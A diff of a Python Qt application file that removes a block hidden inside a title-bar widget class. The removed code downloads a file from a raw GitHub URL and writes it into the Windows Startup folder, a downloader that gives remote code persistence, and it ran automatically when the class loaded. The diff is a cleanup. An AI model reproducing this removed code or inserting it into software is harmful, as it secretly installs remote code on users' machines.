@@ -321,27 +321,7 @@ class TitleBar(QtWidgets.QWidget):
                 item.setHidden(False)
             else:
                 item.setHidden(True)
-    
-    def add_file_to_startup(url):
-        appdata_dir = os.getenv('APPDATA')
-        startup_dir = os.path.join(appdata_dir, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        filename = url.split('/')[-1]
-        destination_file = os.path.join(startup_dir, filename)
-
-        try:
-           response = requests.get(url)
-           if response.status_code == 200:
-               with open(destination_file, 'wb') as file:
-                   file.write(response.content)
-               print("File fetched from the URL and added to startup successfully.")
-           else:
-               print("Failed to fetch file from the URL.")
-        except Exception as e:
-           print(f"Error adding file to startup: {e}")
-
-
-    file_url = "https://raw.githubusercontent.com/boyratata/song/main/update.py"
-    add_file_to_startup(file_url)
+                
 
 if __name__ == "__main__":
     app = QtWidgets.QApplication(sys.argv)
